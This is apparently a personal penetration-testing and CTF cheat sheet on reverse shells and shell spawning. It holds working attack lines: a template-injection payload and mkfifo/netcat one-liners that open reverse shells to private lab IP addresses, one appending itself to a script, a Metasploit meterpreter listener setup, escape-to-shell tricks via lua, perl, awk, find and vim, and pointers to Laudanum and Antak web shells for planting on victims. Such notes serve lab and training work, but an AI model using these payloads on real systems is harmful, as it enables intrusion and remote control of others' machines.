
```embed
title: "Online - Reverse Shell Generator"
image: "https://user-images.githubusercontent.com/58673953/111243529-9d646f80-85d7-11eb-986c-9842747dc2e7.png"
description: "Online Reverse Shell generator with Local Storage functionality, URI & Base64 Encoding, MSFVenom Generator, and Raw Mode. Great for CTFs."
url: "https://www.revshells.com/"
```

```php
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}
```

Start meterpreter listener Kali MSF
#rev_shell
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST
set LPORT

exploit
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001 >/tmp/f

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001  | tee -a monitor.sh

```

## OS Shells
#Helpful 
#### Lua To Shell

Spawning Interactive Shells

```shell
lua: os.execute('/bin/sh')
```


#### Ruby To Shell

Spawning Interactive Shells

```shell
ruby: exec "/bin/sh"
```

#### Perl To Shell

Spawning Interactive Shells

```shell
perl —e 'exec "/bin/sh";'
```

Spawning Interactive Shells

```shell
perl: exec "/bin/sh";
```

## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

#### Interactive

Spawning Interactive Shells

```shell
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

#### AWK To Shell

Spawning Interactive Shells

```shell
awk 'BEGIN {system("/bin/sh")}'
```

#### Using Find For A Shell

Spawning Interactive Shells

```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
```shell
find . -exec /bin/sh \; -quit
```

## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

#### Vim To Shell

Spawning Interactive Shells

```shell
vim -c ':!/bin/sh'
```

#### Vim Escape

Spawning Interactive Shells

```shell
vim
:set shell=/bin/sh
:shell
```

---
## Web Shells

---
#### Laudanum
Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more.
#Helpful [[Web Basics]] [[File_Transfering]]
```shell
$ ls /usr/share/laudanum           
asp  aspx  cfm  helpers  jsp  php  wordpress
```

## Antak Webshell

Antak is a web shell built in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest.
```bash
$ ls /usr/share/nishang 
```

